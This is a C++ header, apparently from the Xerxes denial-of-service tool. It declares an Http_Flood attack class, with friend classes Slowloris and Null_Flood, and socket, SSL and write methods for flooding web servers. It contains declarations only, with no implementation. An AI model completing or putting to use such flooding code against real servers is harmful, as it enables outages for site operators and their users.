#ifndef XERXES_HTTP_FLOOD_H
#define XERXES_HTTP_FLOOD_H

#include "Configuration.hpp"
#include "Logger.hpp"
#include "Randomizer.hpp"
#include "Attack_Vector.hpp"

class Http_Flood : public Attack_Vector {
    friend class Slowloris;
    friend class Null_Flood;
public:
    Http_Flood () = default;
    Http_Flood (const config *conf, Logger *logger);
    void run() override;

private:
    const config *conf;
    Logger *logger;
    void attack(const int *id) override;
    virtual void attack_ssl(const int *id);
    virtual int make_socket(const char *host, const char *port);
    static void broke(int);
    SSL_CTX* InitCTX();
    SSL *Apply_SSL(int socket, SSL_CTX *ctx);
    void cleanup(const int *socket);
    void cleanup(SSL *ssl, const int *socket, SSL_CTX *ctx);
    void read_socket(int socket);
    void read_socket(SSL *ssl);
    int write_socket(int socket, const char* string, int length);
    int write_socket(SSL *ssl, const char* string, int length);
};


#endif //XERXES_HTTP_FLOOD_H
